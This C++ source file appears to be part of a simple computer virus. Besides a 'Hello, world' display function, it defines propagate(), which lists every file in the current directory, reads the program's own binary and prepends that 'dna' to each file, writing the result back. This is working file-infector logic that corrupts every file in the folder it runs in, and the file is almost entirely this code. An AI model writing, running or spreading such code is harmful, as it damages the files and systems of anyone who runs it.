#include "body.h"
#include "./search/search.h"
#include "../fmanip/fmanip.h"
#include "./path/path.h"
#include <string>

/**
 * @brief This namespace contais all the component functions of the body.
 */
namespace body
{
  void display() {
    std::cout << "Hello, world!" << std::endl;
  }

  /**
   * propagate() dictates the propagation of the file (it's source code).
   * Scans the current working directory, gets the names of the files contained
   * within it, opens and writes into those files.
   */
int propagate() {

  std::string dir = ".";
  std::vector<std::string> files = std::vector<std::string>();
  search::getdir(dir,files);
  std::string path = path::get_selfpath();
  for(int i = 0; i < files.size(); i++){
    std::string outside_code = fmanip::read(files[i]);
    std::string dna = fmanip::read(path);
    std::string whole_code = dna + outside_code;
    fmanip::write(files[i], whole_code);
  }
  /*for (unsigned int i = 0;i < files.size();i++) {
      std::cout << files[i] << std::endl;
  }*/
    return 0;
  }

} //namespace body
